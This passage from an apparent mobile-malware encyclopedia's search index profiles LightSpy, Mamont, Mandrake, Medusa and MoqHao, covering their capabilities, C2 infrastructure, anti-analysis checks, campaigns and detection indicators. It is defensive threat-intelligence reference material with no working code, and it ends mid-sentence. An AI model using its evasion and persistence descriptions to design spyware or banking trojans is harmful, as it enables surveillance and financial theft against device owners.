<code>baseinfo</code> Device fingerprinting (IMEI, model, OS version, SIM info) <code>wifi</code> WiFi network enumeration, connected network details, local network scanning"},{"location":"malware/families/lightspy/#expanded-capabilities-2024-2025","title":"Expanded Capabilities (2024-2025)","text":"<p>Hunt.io documented newer versions with expanded social media targeting:</p> Capability Details Facebook data extraction Database file extraction from the Facebook Android app Instagram data extraction Message and account metadata collection from Instagram 100+ commands Cross-platform command set spanning Android, iOS, macOS, Windows, Linux, and routers Plugin version tracking Centralized management of plugin updates across deployed implants Transmission management Operator control over data exfiltration scheduling and bandwidth"},{"location":"malware/families/lightspy/#ios-capabilities","title":"iOS Capabilities","text":"<p>The iOS implant mirrors the Android plugin set with platform-specific adaptations:</p> Category Details Messages SMS, iMessage, email Messaging apps WeChat, QQ, Telegram, WhatsApp Location GPS with fine-grained positioning Calls Call history extraction Contacts Full address book exfiltration WiFi Network enumeration and connected AP details Browser Safari history and bookmarks Keychain iOS Keychain data extraction"},{"location":"malware/families/lightspy/#technical-details","title":"Technical Details","text":""},{"location":"malware/families/lightspy/#core-architecture","title":"Core Architecture","text":"<p>The LightSpy Core operates as a plugin itself, responsible for orchestrating all functions in the attack chain. It exports a C2 communication function that individual plugins call to exfiltrate collected data. The Core is highly configurable through updatable operator-defined settings, allowing precise control over what data is collected and when.</p> <p>On first execution, the Core:</p> <ol> <li>Creates the <code>light2.db</code> SQLite database for local state management</li> <li>Registers with the C2 server, sending device fingerprint and plugin status</li> <li>Receives plugin download URLs via WebSocket</li> <li>Downloads, validates, and loads surveillance plugins</li> <li>Reports plugin versions and operational status back to the operator</li> </ol>"},{"location":"malware/families/lightspy/#c2-infrastructure","title":"C2 Infrastructure","text":"<p>Hunt.io's certificate analysis mapped LightSpy's infrastructure:</p> Aspect Details Server locations Primarily China and Hong Kong, with one server identified in Japan Hosting providers Topway Global Limited and ChinaNet host most certificate-bearing servers Web server Nginx 1.14.0 used consistently across LightSpy and AndroidControl infrastructure TLS certificates High-port certificates (50000+ range) used as fingerprinting markers Communication WebSocket for plugin delivery and commands, HTTPS for data exfiltration and logs <p>The shared infrastructure between LightSpy and WyrmSpy/AndroidControl, including identical Nginx configurations and overlapping certificate patterns, is the primary technical basis for linking these campaigns under APT41.</p>"},{"location":"malware/families/lightspy/#persistence-and-anti-analysis","title":"Persistence and Anti-Analysis","text":"Technique Details Plugin-based loading Surveillance modules downloaded post-installation reduce static analysis surface SQLite state management Local database tracks plugin status, enabling graceful recovery from interruptions WebSocket C2 channel Persistent bidirectional connection avoids polling-based detection patterns Selective activation Operators can enable or disable specific plugins per target"},{"location":"malware/families/lightspy/#known-deployments-and-targets","title":"Known Deployments and Targets","text":"Period Targets Context January-March 2020 Hong Kong residents Watering hole mimicking Apple Daily during political unrest 2020-2023 Southeast Asian mobile users Broader campaigns documented by Kaspersky 2024 Southern Asia, possibly India BlackBerry documented renewed espionage campaign 2024 Southern Asia BlackBerry documented DeepData framework deployed alongside LightSpy 2025 Cross-platform targets Hunt.io identified expanded command set and social media targeting"},{"location":"malware/families/lightspy/#notable-campaigns-and-discoveries","title":"Notable Campaigns and Discoveries","text":"<p>January 2020: A watering hole site mimicking Hong Kong's Apple Daily newspaper is discovered delivering a full iOS exploit chain. Kaspersky publishes the initial technical analysis of the LightSpy iOS implant, documenting the Safari/WebKit exploit chain and modular surveillance capabilities.</p> <p>March 2020: Trend Micro publishes companion research, and Kaspersky confirms ongoing watering hole campaigns targeting Southeast Asian mobile users across iOS, Android, and desktop platforms.</p> <p>July 2023: Lookout attributes WyrmSpy and DragonEgg to APT41, documenting advanced Android surveillance tools. Google confirms the APT41 attribution.</p> <p>October 2023: ThreatFabric publishes \"LightSpy mAPT: Mobile Payment System Attack\", linking DragonEgg to the LightSpy framework and documenting 14 Android plugins including the WeChat Pay bill module. This analysis unifies the Android and iOS campaigns under a single framework.</p> <p>April 2024: BlackBerry publishes \"LightSpy Returns\", documenting a renewed espionage campaign targeting Southern Asia with updated LightSpy infrastructure.</p> <p>June 2024: ThreatFabric documents the macOS variant of LightSpy, confirming cross-platform expansion beyond mobile.</p> <p>October 2024: Updated iOS variant documented with expanded plugin count (from 12 to 28) and destructive capabilities added to the surveillance toolkit.</p> <p>November 2024: BlackBerry documents APT41's DeepData framework deployed alongside LightSpy in targeted Southern Asian espionage operations, including capabilities to extract Fortinet VPN credentials.</p> <p>February 2025: Hunt.io publishes infrastructure analysis revealing over 100 commands across all platforms, with new Facebook and Instagram data extraction modules for Android. Certificate tracking maps infrastructure primarily to China and Hong Kong hosting providers.</p>"},{"location":"malware/families/lightspy/#related-families","title":"Related Families","text":"Family Relationship Pegasus Both are sophisticated cross-platform surveillance frameworks, though Pegasus is commercial spyware sold to governments while LightSpy serves Chinese state intelligence directly. Pegasus uses zero-click exploit chains; LightSpy relies on watering holes and trojanized apps. Predator Both are state-linked surveillance platforms targeting mobile devices. Predator (Cytrox/Intellexa) is commercial; LightSpy is state-operated. Both use modular plugin architectures. Hermit Both employ modular plugin architectures where surveillance capabilities are downloaded post-installation from C2. Hermit uses ISP-assisted delivery; LightSpy uses watering holes. KoSpy Both are state-sponsored Android surveillance tools with plugin-based architectures. KoSpy serves North Korean intelligence (APT37); LightSpy serves Chinese intelligence (APT41). Both use multi-stage C2 with legitimate services for initial configuration."},{"location":"malware/families/mamont/","title":"Mamont","text":"<p>Mamont was the most active Android banking trojan family in 2024, accounting for 36.70% of all mobile banking malware attacks detected by Kaspersky. Kaspersky documented the family in December 2024, revealing a Russia-exclusive banking trojan distributed as fake parcel-tracking applications. The family blocked 31,000+ attacks in October-November 2024 alone. Despite targeting only Russian users, its sheer volume made it the dominant mobile banking threat globally for the year, surpassing established families like Anatsa, GodFather, and Hook in detection counts.</p>"},{"location":"malware/families/mamont/#overview","title":"Overview","text":"Attribute Details First Seen 2024 Last Seen Active (ongoing campaigns) Status Active, high volume Type Banking trojan, notification interceptor Attribution Unknown; targets Russia exclusively Aliases None known"},{"location":"malware/families/mamont/#vendor-names","title":"Vendor Names","text":"Vendor Name Kaspersky HEUR:Trojan-Banker.AndroidOS.Mamont DrWeb Android.BankBot.Mamont ESET Android/Spy.Banker.Mamont"},{"location":"malware/families/mamont/#origin-and-lineage","title":"Origin and Lineage","text":"<p>Mamont is independently developed with no known code connection to other banking trojan families. Its focus on the Russian market distinguishes it from the European and global banking trojans that dominate the mobile threat landscape. The family's approach (fake parcel-tracking apps, push notification interception) is technically simpler than western-targeting families like Octo or Hook but highly effective at scale.</p>"},{"location":"malware/families/mamont/#distribution","title":"Distribution","text":"<p>Mamont distributes exclusively through social engineering via fake parcel-tracking applications:</p> Vector Details Smishing SMS messages claiming a parcel is ready for delivery Social media Telegram channels and forums promoting fake tracking apps Fake websites Landing pages mimicking Russian postal and delivery services <p>The social engineering relies on Russian-language delivery notifications directing users to install a \"tracking app\" that is the Mamont APK. The lure themes rotate across Russian delivery services and e-commerce platforms.</p>"},{"location":"malware/families/mamont/#capabilities","title":"Capabilities","text":"Capability Description Push notification interception Intercepts push notifications including banking OTP codes SMS interception Reads and hides incoming SMS messages SMS sending Sends SMS from victim's device (for spreading and premium SMS) Contact exfiltration Uploads contact list to C2 Device info collection IMEI, phone number, installed banking apps Photo theft Captures and exfiltrates photos from device storage Overlay attacks Displays phishing screens over Russian banking apps Self-propagation Forwards malicious links via SMS to victim's contacts"},{"location":"malware/families/mamont/#permissions","title":"Permissions","text":"Permission Purpose BIND_NOTIFICATION_LISTENER_SERVICE Intercept all push notifications including OTPs READ_SMS Read incoming SMS messages for credential and OTP theft RECEIVE_SMS Intercept SMS in real-time before the user sees them SEND_SMS Send SMS from victim device for spreading and premium fraud READ_CONTACTS Exfiltrate contact list for targeting and self-propagation READ_EXTERNAL_STORAGE Access photos and files on device storage READ_PHONE_STATE Collect device identifiers (IMEI, phone number) INTERNET Communicate with C2 server RECEIVE_BOOT_COMPLETED Restart malware service after device reboot"},{"location":"malware/families/mamont/#push-notification-interception","title":"Push Notification Interception","text":"<p>Mamont's primary credential theft mechanism targets push notifications rather than traditional overlay attacks. By intercepting push notifications from banking apps, the trojan captures OTP codes, transaction confirmations, and other sensitive data delivered through the Android notification system. This requires BIND_NOTIFICATION_LISTENER_SERVICE permission.</p>"},{"location":"malware/families/mamont/#technical-details","title":"Technical Details","text":""},{"location":"malware/families/mamont/#notification-listener","title":"Notification Listener","text":"<p>The malware registers as a notification listener service, gaining access to all push notifications displayed on the device:</p> <ul> <li>Filters notifications by package name (targeting Russian banking apps)</li> <li>Extracts text content including OTP codes</li> <li>Forwards notification data to C2 in real-time</li> <li>Optionally hides notifications from the user</li> </ul>"},{"location":"malware/families/mamont/#telegram-c2-communication","title":"Telegram C2 Communication","text":"<p>Mamont uses Telegram bot API as a secondary C2 channel alongside its HTTP infrastructure. Stolen data -- including intercepted SMS, notifications, and screenshots -- can be forwarded to operator-controlled Telegram channels. This dual-channel approach provides resilience: if the HTTP C2 server is taken down, the Telegram channel continues to receive exfiltrated data. The use of Telegram as C2 is shared with families like Raton and some SpyNote variants.</p>"},{"location":"malware/families/mamont/#http-c2","title":"HTTP C2","text":"<ul> <li>HTTP-based communication with JSON payloads</li> <li>Registration with device fingerprint on first launch</li> <li>Polling-based command retrieval</li> <li>Exfiltrated data (SMS, notifications, contacts) sent via POST requests</li> </ul>"},{"location":"malware/families/mamont/#c2-infrastructure","title":"C2 Infrastructure","text":"Component Details Primary protocol HTTP with JSON payloads Secondary channel Telegram Bot API Registration Device fingerprint (IMEI, phone number, installed apps) on first launch Command retrieval Polling-based at regular intervals Data exfiltration POST requests for SMS, notifications, contacts; Telegram for real-time alerts"},{"location":"malware/families/mamont/#target-regions","title":"Target Regions","text":"Region Details Russia Exclusive target, all lures in Russian <p>Mamont targets major Russian banks and financial apps. The exclusive Russian focus and the use of Russian-language social engineering suggest domestic operators. This pattern differs from most documented banking trojans which target multiple countries.</p>"},{"location":"malware/families/mamont/#notable-campaigns","title":"Notable Campaigns","text":"<p>2024: Mamont emerges as the highest-volume mobile banking trojan globally. Kaspersky's 2024 mobile threat report places it at 36.70% of all banking malware detections.</p> <p>2024, October-November: Kaspersky documents the parcel-tracking distribution, blocking 31,000+ attacks in two months. The analysis reveals push notification interception as the primary theft mechanism.</p> <p>2025, March: Russian authorities arrested three suspects linked to the Mamont operation. Despite the arrests, new Mamont samples continued to surface, suggesting either additional operators or that the infrastructure remained active.</p>"},{"location":"malware/families/mamont/#detection","title":"Detection","text":"Indicator Type Details Notification listener registration App registering as <code>NotificationListenerService</code> without legitimate reason Targeted package monitoring Filtering notifications by Russian banking app package names SMS send/receive patterns Bulk SMS access combined with notification listener is unusual for utility apps Telegram API calls Network connections to <code>api.telegram.org</code> from a parcel-tracking app Russian-language strings Hardcoded Russian-language UI strings in APK resources"},{"location":"malware/families/mamont/#related-families","title":"Related Families","text":"Family Relationship Raton Both use Telegram bot API as a C2 channel for data exfiltration SpyNote Some variants similarly leverage Telegram for C2, though SpyNote is a full RAT rather than a banking-focused trojan FakeCalls Both focus on a single national market with localized social engineering"},{"location":"malware/families/mamont/#references","title":"References","text":"<ul> <li>Kaspersky - Mamont banker disguised as parcel-tracking app (December 2024)</li> <li>Kaspersky - Mobile threat report 2024 (March 2025)</li> <li>Bleeping Computer - Russia arrests three for developing Mamont banking trojan (March 2025)</li> </ul>"},{"location":"malware/families/mandrake/","title":"Mandrake","text":"<p>Mandrake is a sophisticated Android spyware platform that operated undetected on Google Play for multiple years across two separate campaigns. Bitdefender first documented the family in 2020, revealing a four-year presence (2016-2020) on Google Play with an estimated 32,000+ installations. Kaspersky documented the return in July 2024, finding new variants that had been present on Google Play since 2022, completely undetected for two years. The second wave moved core malicious functionality into native libraries obfuscated with OLLVM and included a \"seppuku\" self-destruct feature that wipes all malware traces from the device.</p>"},{"location":"malware/families/mandrake/#overview","title":"Overview","text":"Attribute Details First Seen 2016 Last Seen Active (second wave discovered 2024) Status Active, under continued development Type Spyware platform, credential stealer Attribution Unknown; sophisticated actor with long operational patience Aliases None known"},{"location":"malware/families/mandrake/#vendor-names","title":"Vendor Names","text":"Vendor Name Kaspersky HEUR:Trojan-Spy.AndroidOS.Mandrake Bitdefender Android.Spy.Mandrake ESET Android/Spy.Mandrake McAfee Android/Mandrake"},{"location":"malware/families/mandrake/#origin-and-lineage","title":"Origin and Lineage","text":"<p>Mandrake is an independently developed spyware platform with no known code connections to other documented families. Its sophistication level (multi-stage loading, OLLVM-obfuscated native libraries, certificate pinning, extended dormancy on Play Store) places it closer to commercial spyware operations like FinSpy or Hermit than to typical banking trojans, though its distribution via Google Play and broad targeting differ from the targeted delivery model of commercial surveillance tools.</p>"},{"location":"malware/families/mandrake/#campaign-timeline","title":"Campaign Timeline","text":"Campaign Period Detection Gap First wave 2016-2020 4 years on Google Play undetected Second wave 2022-2024 2 years on Google Play undetected <p>The ability to maintain presence on Google Play for years without detection by Play Protect or any AV engine demonstrates exceptional anti-detection engineering.</p>"},{"location":"malware/families/mandrake/#distribution","title":"Distribution","text":"<p>Both campaigns used Google Play as the primary distribution vector. Apps appeared as legitimate utilities:</p>"},{"location":"malware/families/mandrake/#first-wave-2016-2020","title":"First Wave (2016-2020)","text":"<p>Finance, automotive, and document management apps. Bitdefender identified apps that functioned legitimately while embedding the Mandrake framework.</p>"},{"location":"malware/families/mandrake/#second-wave-2022-2024","title":"Second Wave (2022-2024)","text":"App Category Installs AirFS (file sharing) Productivity 30,305 Astro Explorer Tools 718 Amber Lifestyle 19 CryptoPulsing Finance 790 Brain Matrix Education 259 <p>The second wave apps had lower install counts but maintained presence for two years, suggesting the operator prioritized stealth over scale.</p>"},{"location":"malware/families/mandrake/#capabilities","title":"Capabilities","text":"Capability Description Screen recording Captures device screen via MediaProjection API Credential theft Phishing overlays for banking and social media apps File exfiltration Browses and uploads files from device storage Contact/SMS theft Reads contacts, call logs, SMS messages GPS tracking Continuous location monitoring Audio recording Records via device microphone App installation Downloads and installs additional APKs Seppuku (self-destruct) Wipes all malware data and traces on operator command Browser cookie theft Extracts authentication cookies from browsers Click simulation Simulates user interactions via accessibility"},{"location":"malware/families/mandrake/#seppuku-self-destruct","title":"Seppuku Self-Destruct","text":"<p>The \"seppuku\" command triggers complete removal of all Mandrake components and data from the device. This anti-forensic feature allows operators to eliminate evidence if they suspect the device is under analysis or if the operation is being investigated. Unlike BRATA's factory reset (which wipes the entire device), seppuku selectively removes only Mandrake artifacts, leaving the device otherwise intact and reducing the likelihood the user notices anything happened.</p>"},{"location":"malware/families/mandrake/#technical-details","title":"Technical Details","text":""},{"location":"malware/families/mandrake/#multi-stage-loading","title":"Multi-Stage Loading","text":"<p>Mandrake uses a three-stage loading architecture:</p> <pre><code>Stage 1: Dropper (Google Play app)\n    \u2192 Decrypts and loads Stage 2 from assets/\nStage 2: Loader (native library)\n    \u2192 Contacts C2 for Stage 3\n    \u2192 Performs environment checks\nStage 3: Core spyware module\n    \u2192 Full functionality downloaded from C2\n    \u2192 Loaded via DexClassLoader\n</code></pre>"},{"location":"malware/families/mandrake/#ollvm-obfuscation-second-wave","title":"OLLVM Obfuscation (Second Wave)","text":"<p>The 2024 variants moved critical functionality into native libraries obfuscated with OLLVM (Obfuscator-LLVM):</p> Technique Purpose Control flow flattening Hides program logic from static analysis String encryption All strings decrypted at runtime Bogus control flow Inserts dead code paths to confuse decompilers Instruction substitution Replaces standard operations with equivalent complex ones <p>This is the same obfuscation framework used by some packer vendors and nation-state tooling. Its application to Google Play malware is uncommon.</p>"},{"location":"malware/families/mandrake/#anti-analysis","title":"Anti-Analysis","text":"Check Method Emulator detection Checks build properties, hardware characteristics, sensor availability Frida detection Scans for Frida server processes and libraries Root detection Checks for su binary, root management apps Debugger detection Checks TracerPid, debug flags Certificate pinning Validates C2 server certificates against embedded pins"},{"location":"malware/families/mandrake/#c2-communication","title":"C2 Communication","text":"<ul> <li>HTTPS with certificate pinning</li> <li>TLS client certificates for mutual authentication</li> <li>Traffic encrypted with AES</li> <li>Heartbeat mechanism to maintain persistent connection</li> <li>Commands and responses serialized with custom binary protocol</li> </ul>"},{"location":"malware/families/mandrake/#target-regions","title":"Target Regions","text":"<p>Mandrake is not narrowly region-specific. The Google Play distribution means infections follow the apps' geographic availability. Kaspersky reported the highest detection rates in Canada, Germany, Italy, Mexico, Spain, Peru, and the UK during the second wave.</p>"},{"location":"malware/families/mandrake/#notable-campaigns","title":"Notable Campaigns","text":"<p>2016-2020: Bitdefender discovers the first Mandrake campaign after four years of undetected operation on Google Play. Multiple utility apps served as dropper vehicles. The research reveals a full-featured spyware platform with credential theft, screen recording, and file exfiltration capabilities.</p> <p>2022-2024: Mandrake returns to Google Play with significantly upgraded anti-detection capabilities. Core malicious logic moved from DEX to OLLVM-obfuscated native libraries. Five apps identified with combined 32,000+ installs over a two-year undetected period.</p> <p>2024, July: Kaspersky publishes analysis of the second wave, documenting the OLLVM obfuscation, seppuku self-destruct feature, and upgraded anti-analysis checks. Google removes identified apps from Play Store.</p>"},{"location":"malware/families/medusa/","title":"Medusa","text":"<p>Medusa is an Android banking trojan and Malware-as-a-Service (MaaS) operation that combines keylogging, real-time screen streaming, and overlay attacks into a full remote access platform for financial fraud. First identified targeting Turkish banks in July 2020, it has expanded to seven countries across North America and Europe. The 2024 v2 rewrite stripped the codebase down to a minimal permission footprint while retaining full fraud capability, a deliberate evasion strategy that allowed it to resurface after nearly a year of dormancy.</p>"},{"location":"malware/families/medusa/#overview","title":"Overview","text":"Attribute Details First Seen July 2020 Status Active (2025) Type Banking trojan, RAT, MaaS Aliases TangleBot (Proofpoint) Attribution Turkish-speaking actors, multiple affiliate groups Distribution Smishing, dropper apps, fake updates"},{"location":"malware/families/medusa/#vendor-names","title":"Vendor Names","text":"Vendor Name ThreatFabric Medusa Cleafy Medusa Proofpoint TangleBot Cyble Medusa Kaspersky Trojan-Banker.AndroidOS.Medusa ESET Android/Spy.Medusa Trend Micro AndroidOS_Medusa Microsoft Trojan:AndroidOS/Medusa SonicWall AndroidOS.Medusa"},{"location":"malware/families/medusa/#origin-and-lineage","title":"Origin and Lineage","text":"<p>ThreatFabric first documented Medusa in July 2020 as a new banking trojan under active development, initially targeting Turkish financial institutions. The malware used TCP for C2 communication, which distinguished it from the HTTP-based protocols common in other Android banking trojans of that era.</p> <p>The family appears to be written from scratch with no direct code lineage to other known banking trojans. Its operators adopted a reserved approach to distribution, avoiding public forum advertisements and instead using side-channels for customer communication.</p> <p>Proofpoint independently identified the same malware in September 2021 under the name TangleBot, based on its extensive use of obfuscation layers (\"tangled\" code). While some researchers initially treated these as distinct families, subsequent analysis confirmed they share the same codebase. The naming discrepancy persists across vendor reporting.</p> <p>In 2022, ThreatFabric discovered Medusa leveraging the same distribution infrastructure as FluBot (Cabassous), indicating either shared affiliates or deliberate collaboration between the two operations.</p> <p>After nearly a year of reduced activity, Cleafy identified the v2 variant in May 2024, noting it had likely been active since July 2023. The rewrite represented a strategic pivot toward evasion over feature density.</p>"},{"location":"malware/families/medusa/#distribution","title":"Distribution","text":"<p>Medusa has used multiple distribution strategies across its lifecycle, shifting from pure smishing to dropper-based delivery.</p> Period Vector Disguise Source 2020-2021 SMS phishing Turkish banking and utility apps ThreatFabric September 2021 SMS phishing COVID-19 updates, utility bills Proofpoint September 2021 Fake government portal Canadian COVID-19 portal Cyble February 2022 SMS (shared with FluBot) DHL, Flash Player, utility apps ThreatFabric 2024 Dropper apps, fake updates Chrome, 4K Sports, InatTV, Purolator, 5G Cleafy <p>The FluBot co-distribution phase was notable: Medusa samples appeared alongside Cabassous payloads from the same smishing service, with Medusa operators using campaign tags like FLUVOICE, FLUFLASH, and FLUDHL that directly referenced FluBot campaigns. Within one month, this approach infected over 1,500 devices through a single botnet disguised as DHL.</p> <p>The v2 distribution strategy shifted to dropper apps that deliver the malware through fake update procedures, moving away from direct SMS links to APK downloads.</p>"},{"location":"malware/families/medusa/#capabilities","title":"Capabilities","text":""},{"location":"malware/families/medusa/#version-1-2020-2022","title":"Version 1 (2020-2022)","text":"Capability Implementation Overlay attacks WebView injects triggered by accessibility foreground detection Keylogging Accessibility-based keystroke capture across all apps Screen streaming Real-time device screen fed to operator via VNC Audio/video capture Record via device microphone and camera SMS interception Read, send, hide SMS for OTP theft Remote interaction Full RAT through accessibility gestures and touch simulation Call recording Capture voice calls Contact harvesting Exfiltrate contacts and SMS history Device admin abuse Lock device screen via DEVICE_ADMIN permission"},{"location":"malware/families/medusa/#version-2-2024","title":"Version 2 (2024)","text":"<p>Cleafy's analysis of the v2 rewrite documented a deliberate reduction in both permissions and commands:</p> <p>Permissions reduced to five core requirements:</p> Permission Purpose Accessibility Services Core functionality: keylogging, UI interaction, overlay triggering Broadcast SMS SMS interception for OTP theft Internet C2 communication Foreground Service Persistent background execution Query/Delete Packages Application enumeration and removal <p>Additional permissions are acquired silently through accessibility service abuse at runtime, avoiding manifest-level declaration.</p> <p>Command set changes:</p> <p>17 commands from v1 were removed, and 5 new commands were added:</p> New Command Action <code>setoverlay</code> Display full-screen black overlay to mask device activity <code>fillfocus</code> Set text value of focused input field to attacker-specified string Delete app Remotely uninstall specified applications Screen off simulation Make device appear inactive during fraud Overlay display Full-screen overlay for credential capture <p>The <code>setoverlay</code> command enables a black screen overlay that makes the device appear powered off or locked while the operator performs fraud in the background. The <code>fillfocus</code> command allows precise text injection into any focused input field, enabling ATS-style transfers.</p>"},{"location":"malware/families/medusa/#technical-details","title":"Technical Details","text":""},{"location":"malware/families/medusa/#c2-communication","title":"C2 Communication","text":"<p>Medusa originally used raw TCP connections for C2 communication, an unusual choice for Android malware. The C2 infrastructure evolved significantly:</p> Version Protocol C2 Resolution v1 (2020) TCP Hardcoded C2 URLs, Telegram bot for backup v1 (2021) TCP Encoded URLs retrieved from Telegram bots (Base64 + custom encoding) v2 (2024) TCP Dynamic retrieval from social media profiles (Telegram, X, ICQ) <p>The dead drop resolver pattern in v2 uses legitimate social media platforms to host encoded C2 addresses. This allows operators to rotate C2 infrastructure without pushing malware updates, increasing resilience against takedowns.</p>"},{"location":"malware/families/medusa/#accessibility-service-abuse","title":"Accessibility Service Abuse","text":"<p>Medusa's accessibility service implementation handles multiple functions simultaneously:</p> <ol> <li>Monitors <code>TYPE_WINDOW_STATE_CHANGED</code> for target app detection and overlay triggering</li> <li>Logs all keystrokes for credential capture</li> <li>Reads screen content for real-time streaming to operator</li> <li>Performs gestures and clicks for remote device control</li> <li>Silently grants additional permissions at runtime</li> <li>Interacts with banking app UI for ATS-style fraud via <code>fillfocus</code></li> </ol>"},{"location":"malware/families/medusa/#botnet-infrastructure","title":"Botnet Infrastructure","text":"<p>Cleafy identified five distinct botnets operating under the Medusa MaaS umbrella:</p> Botnet Primary Targets Distribution Focus AFETZEDE Turkey, Canada, US Traditional smishing ANAKONDA Turkey Smishing PEMBE Turkey Smishing TONY Turkey, Canada, US Smishing UNKN Italy, France, Europe Dropper apps from untrusted sources <p>The separation between Turkish-focused botnets (AFETZEDE, ANAKONDA, PEMBE, TONY) and the European-focused UNKN botnet suggests at least two distinct affiliate groups operating the same malware.</p>"},{"location":"malware/families/medusa/#target-regions-and-financial-institutions","title":"Target Regions and Financial Institutions","text":"<p>Medusa's targeting has expanded significantly from its Turkish origins.</p> Period Regions Targets 2020-2021 Turkey Turkish banking institutions September 2021 US, Canada COVID-19 themed, broad credential theft 2022 Turkey, North America, Europe Banking apps, expanded through FluBot infrastructure 2024 Canada, France, Italy, Spain, Turkey, UK, US Banking, cryptocurrency, and utility apps across 7 countries <p>The v2 expansion into Western Europe, particularly France and Italy through the UNKN botnet, represented a strategic geographic pivot, indicating growing demand from European-focused affiliates within the MaaS operation.</p>"},{"location":"malware/families/medusa/#notable-campaigns","title":"Notable Campaigns","text":"<p>July 2020: ThreatFabric identified Medusa as a new Android banking trojan targeting Turkish banks, noting its use of TCP-based C2 and active development status.</p> <p>September 2021: Proofpoint published their TangleBot analysis, documenting campaigns using COVID-19 and utility bill lures targeting US and Canadian users. The analysis noted extensive obfuscation, including hidden .dex files, minified code, and excessive dead code. Proofpoint counted nine consecutive dialog boxes users had to accept before full installation completed.</p> <p>September 2021: Cyble documented a campaign using a fake Canadian Government COVID-19 portal to distribute Medusa disguised as a Flash Player update. The malware retrieved its C2 URL from a Telegram bot using Base64 and custom encoding.</p> <p>February 2022: ThreatFabric published \"Partners in Crime\", revealing that Medusa had begun using the same smishing distribution network as FluBot (Cabassous). The FLUDHL botnet alone accumulated over 1,500 infections within a month by masquerading as DHL delivery notifications.</p> <p>May 2024: Cleafy published \"Medusa Reborn\", documenting the v2 variant that had been active since July 2023. The rewrite reduced the permission footprint to five manifest-declared permissions, removed 17 commands, added 5 new ones (including the black screen overlay), and shifted distribution to dropper-based delivery through fake Chrome, 4K Sports, and utility apps across seven countries.</p>"},{"location":"malware/families/moqhao/","title":"MoqHao","text":"<p>MoqHao (also tracked as Roaming Mantis, XLoader, Wroba) is a long-running Android banking trojan and spyware distributed primarily through SMS phishing (smishing). Active since at least 2018, it targets East Asian users across Japan, South Korea, and Taiwan, with periodic expansion to Europe. The operation is attributed to the Roaming Mantis threat actor. McAfee first documented the family spreading via SMS phishing in South Korea in 2018. The 2024 evolution introduced auto-execution without user interaction, a significant capability escalation that runs the malware immediately after installation.</p>"},{"location":"malware/families/moqhao/#overview","title":"Overview","text":"Attribute Details First Seen 2018 Last Seen Active (ongoing campaigns) Status Active, continuously evolving Type Banking trojan, spyware, smishing distributor Attribution Roaming Mantis (suspected China-nexus) Aliases XLoader, Wroba, FakeChromeUpdate"},{"location":"malware/families/moqhao/#vendor-names","title":"Vendor Names","text":"Vendor Name Kaspersky HEUR:Trojan-Banker.AndroidOS.Wroba McAfee Android/MoqHao ESET Android/TrojanDropper.Agent (some variants) ThreatFabric MoqHao Trend Micro AndroidOS_Wroba Fortinet Android/Agent.FKP!tr Symantec Android.Reputation.2"},{"location":"malware/families/moqhao/#origin-and-lineage","title":"Origin and Lineage","text":"<p>MoqHao is an independently developed family with no known code lineage to other banking trojan families. The Roaming Mantis actor behind it has operated since at least 2017, initially compromising home routers to redirect DNS queries and serve malicious APKs. Kaspersky tracked the campaign's expansion to Europe in 2022, documenting its evolution from router-based to pure smishing distribution.</p> <p>The family is cross-platform in scope: Android devices receive the MoqHao APK payload, while iOS users are redirected to Apple ID phishing pages. Desktop users may be served cryptocurrency mining scripts.</p>"},{"location":"malware/families/moqhao/#distribution","title":"Distribution","text":"<p>MoqHao distributes exclusively through smishing. The attack chain varies by region but follows a consistent pattern:</p> Stage Details Initial SMS Delivery notification impersonating postal services (Yamato Transport, Japan Post, Korea Post) Landing page Fake delivery tracking page prompting APK download Installation Disguised as Chrome browser update or delivery tracking app Permissions Requests accessibility service, SMS, contacts Propagation Reads victim's contacts, sends smishing SMS to spread further"},{"location":"malware/families/moqhao/#distribution-evolution","title":"Distribution Evolution","text":"<p>McAfee documented the evolution across multiple blog posts:</p> Year Method 2017-2018 DNS hijacking via compromised routers, serving fake Chrome updates 2019 Found on Google Play targeting Japan and Korea 2021 OS-specific payloads for Android and iOS via smishing 2024 Auto-execution variant runs immediately after installation <p>The 2024 auto-execution capability is notable: new variants start automatically without the user ever launching the app, triggered by the Android system's handling of specific manifest configurations. This eliminates the social engineering step of convincing users to open the app after installation.</p>"},{"location":"malware/families/moqhao/#capabilities","title":"Capabilities","text":"Capability Description SMS phishing (smishing) Sends phishing SMS to victim's contacts for worm-like propagation Banking credential theft Overlay attacks targeting banking apps SMS interception Reads and intercepts SMS including OTPs Contact exfiltration Uploads full contact list to C2 for targeting Device info collection IMEI, phone number, OS version, installed apps Photo theft Accesses and exfiltrates device photos Auto-execution (2024) Runs immediately after installation without user launch Fake Chrome overlay Persistent Chrome update prompt concealing malicious activity"},{"location":"malware/families/moqhao/#technical-details","title":"Technical Details","text":""},{"location":"malware/families/moqhao/#auto-execution-mechanism-2024","title":"Auto-Execution Mechanism (2024)","text":"<p>The 2024 variant documented by McAfee achieves auto-execution through Android's content provider initialization. The malware registers a content provider that the system initializes during app installation, triggering malicious code before the user interacts with the app.</p>"},{"location":"malware/families/moqhao/#c2-infrastructure","title":"C2 Infrastructure","text":"<p>MoqHao uses social media profiles (Pinterest, Imgur, and other platforms) as dead drop resolvers to retrieve actual C2 server addresses. The C2 URLs are encoded in profile descriptions or image metadata, allowing operators to rotate infrastructure without updating the malware.</p>"},{"location":"malware/families/moqhao/#smishing-infrastructure","title":"Smishing Infrastructure","text":"<p>Each infected device functions as an SMS distribution node. The C2 server provides:</p> <ul> <li>SMS message templates localized by region</li> <li>Target phone number lists (harvested from previously infected devices)</li> <li>Timing parameters to avoid carrier-level SMS filtering</li> </ul> <p>This creates a distributed smishing network similar to FluBot's approach, though MoqHao predates FluBot by two years and primarily targets Asian markets.</p>"},{"location":"malware/families/moqhao/#target-regions","title":"Target Regions","text":"Region Target Apps/Services Japan Yamato Transport, Japan Post, banking apps South Korea Korea Post, major banking apps, cryptocurrency exchanges Taiwan Postal services, financial institutions Europe Expanded in 2022 per Kaspersky, postal service lures"},{"location":"malware/families/moqhao/#notable-campaigns","title":"Notable Campaigns","text":"<p>2018: McAfee documents MoqHao spreading via SMS phishing in South Korea, impersonating Chrome browser updates.</p> <p>2019: McAfee finds MoqHao-related spyware on Google Play targeting Japan and Korea, marking the family's first appearance on the official app store.</p> <p>2021: McAfee documents OS-specific payloads in Roaming Mantis smishing campaigns. Android devices receive MoqHao APK; iOS users get Apple ID phishing.</p> <p>2022: Kaspersky tracks Roaming Mantis expansion to Europe, documenting campaigns against French and German users using postal service lures.</p> <p>2024, February: McAfee reports the auto-execution evolution. New MoqHao variants start automatically after installation without requiring user interaction. The malware displays fake Chrome update prompts while operating in the 